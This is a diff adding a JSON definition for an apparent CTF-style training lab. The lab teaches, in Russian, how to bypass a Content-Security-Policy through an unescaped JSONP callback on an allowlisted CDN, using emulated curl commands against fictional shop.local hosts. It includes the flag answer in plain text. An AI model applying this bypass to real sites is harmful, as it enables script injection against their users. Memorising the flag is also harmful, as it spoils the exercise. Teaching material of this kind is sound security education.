@@ -1,0 +1,22 @@
+{
+  "id": "web-xss-bypass-advanced",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{csp_byp4ss_v14_4ll0wl1st3d_jsonp}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: обход CSP через разрешённый JSONP\n\nУ `shop.local` строгая CSP: `script-src 'self' https://cdn.shop.local`.\nПрямой inline-`<script>` не выполнится. Но если среди разрешённых доменов\nесть эндпоинт, отдающий данные как JS (JSONP), его можно подключить как\n«легальный» скрипт.\n\n1. Посмотри политику:\n\n   curl -sI https://shop.local/ | grep -i content-security-policy\n\n2. На разрешённом CDN есть JSONP-эндпоинт — `callback` подставляется в ответ\n   без экранирования:\n\n   curl -s 'https://cdn.shop.local/api/user?callback=alert'\n\n3. Тот же CDN отдаёт приватный эндпоинт, который тоже отражает `callback`:\n\n   curl -s 'https://cdn.shop.local/api/secret?callback=cb' > found.txt\n\n4. В ответе — секрет (флаг). Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local и cdn.shop.local)",
+      "cases": [
+        { "match": "-sI|--head", "example": "-sI https://shop.local/", "output": "HTTP/1.1 200 OK\nContent-Type: text/html\nContent-Security-Policy: default-src 'self'; script-src 'self' https://cdn.shop.local\n" },
+        { "match": "secret", "example": "-s 'https://cdn.shop.local/api/secret?callback=cb'", "output": "cb({\"secret\":\"nto{csp_byp4ss_v14_4ll0wl1st3d_jsonp}\"});\n" },
+        { "match": "callback", "example": "-s 'https://cdn.shop.local/api/user?callback=alert'", "output": "alert({\"user\":\"alice\"});\n" },
+        { "match": "cdn\\.shop\\.local", "example": "-s 'https://cdn.shop.local/'", "output": "{\"service\":\"cdn\",\"jsonp\":true}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируются shop.local (CSP) и cdn.shop.local (JSONP).\n"
+    }
+  }
+}
